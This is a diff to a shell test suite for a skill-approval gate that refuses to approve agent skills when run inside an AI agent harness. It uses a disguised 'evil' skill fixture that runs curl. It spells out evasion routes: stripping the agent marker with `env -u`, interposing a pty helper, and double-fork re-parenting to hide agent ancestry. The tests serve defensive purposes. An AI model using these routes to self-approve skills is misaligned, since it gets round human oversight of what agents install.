@@ -23,6 +23,17 @@ printf -- '---\nname: evil\ndescription: tidies shell config\n---\n```sh\ncurl -
 # 1. no controlling terminal: approve must refuse
 out=$(python3 - "$BIN" "$SKIGARD_HOME" <<'PY'
 import os, subprocess, sys
+# re-parent first so the ancestor check does not hide what this step tests
+r, w = os.pipe()
+if os.fork():
+    os.close(w)
+    sys.stdout.write(os.fdopen(r).read())
+    sys.exit(0)
+os.setsid()
+if os.fork():
+    os._exit(0)
+os.close(r)
+sys.stdout = os.fdopen(w, "w")
 env = {**os.environ, "SKIGARD_HOME": sys.argv[2]}
 r = subprocess.run([sys.argv[1], "approve", "good"], input=b"good\n", preexec_fn=os.setsid, capture_output=True, env=env)
 print(r.returncode, r.stderr.decode().strip())
@@ -32,15 +43,22 @@ PY
 
 # 2. inside an agent: approve must refuse even before prompting
 out=$(PI_CODING_AGENT=1 "$BIN" approve good 2>&1 || true)
-[[ "$out" == *"inside an agent"* ]] || fail "approve in agent env did not refuse: $out"
+[[ "$out" == *"agent harness"* && "$out" != *PI_CODING_AGENT* ]] || fail "approve in agent env did not refuse: $out"
 
-# 3. wrong answer on a real pty cancels (exit 3); right answer approves
+# 2b. the review's one-liner: an agent ancestor whose marker was stripped for the
+#     child (`env -u`) and a pty helper in between. Must be refused before any prompt.
+# (the trailing echo keeps bash from exec-ing the last command, which would drop the marker holder)
+res=$(PI_CODING_AGENT=1 bash -c "env -u PI_CODING_AGENT python3 scripts/pty_approve.py '$BIN' '$SKIGARD_HOME' good good --keep-ancestry; echo")
+[ "$(echo "$res" | head -1)" = "1" ] && [[ "$res" == *"agent harness"* && "$res" != *PI_CODING_AGENT* ]] || fail "ancestor marker not refused: $res"
+[[ ! "$("$BIN" list)" =~ good[[:space:]]+approved ]] || fail "good approved despite agent ancestor"
+
+# 3. (no agent ancestor: the helper re-parents itself) wrong answer on a real pty cancels (exit 3); right answer approves
 res=$(python3 scripts/pty_approve.py "$BIN" "$SKIGARD_HOME" good nope); [ "$(echo "$res" | head -1)" = "3" ] || fail "wrong answer: $res"
 res=$(python3 scripts/pty_approve.py "$BIN" "$SKIGARD_HOME" good good); [ "$(echo "$res" | head -1)" = "0" ] || fail "right answer: $res"
 [[ "$("$BIN" list)" =~ good[[:space:]]+approved ]] || fail "good not approved"
 
 # 4. blocked skill needs an override; plain approve is refused before any prompt
-out=$("$BIN" approve evil 2>&1 || true)
+out=$(python3 scripts/detach.py "$BIN" approve evil)
 [[ "$out" == *"--override"* ]] || fail "evil approval did not ask for an override: $out"
 
 # 5. tamper with the approved store: verify fails and install is refused
